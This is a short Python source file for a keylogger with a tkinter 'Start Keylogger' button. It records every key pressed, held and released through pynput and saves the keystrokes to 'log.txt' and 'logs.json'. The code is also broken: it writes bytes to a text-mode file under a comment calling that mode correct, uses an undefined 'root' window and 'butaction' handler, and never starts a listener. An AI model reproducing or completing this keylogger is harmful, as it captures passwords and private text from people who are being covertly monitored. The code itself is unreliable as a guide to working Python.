import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

key_list = []
x = False
key_strokes=""

def update_text_file(key):
    with open('log.txt', 'a') as key_stroke:     # append mode

        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w') as Key_log:   # correct mode

        key_list_bytes = json.dumps(key_list).encode()  # JSON string
        Key_log.write(key_list_bytes)

def on_press(key): 
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
        )
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
    )
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key) 
    update_text_file(str(key_strokes))
    

    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")

empty = Label(root, text="Keylogger", font='verdana 11 bold').grid(row=2,column=2)
Button(root, text="Start Keylogger", command=butaction).grid(row=5, column=2)
root.mainloop()


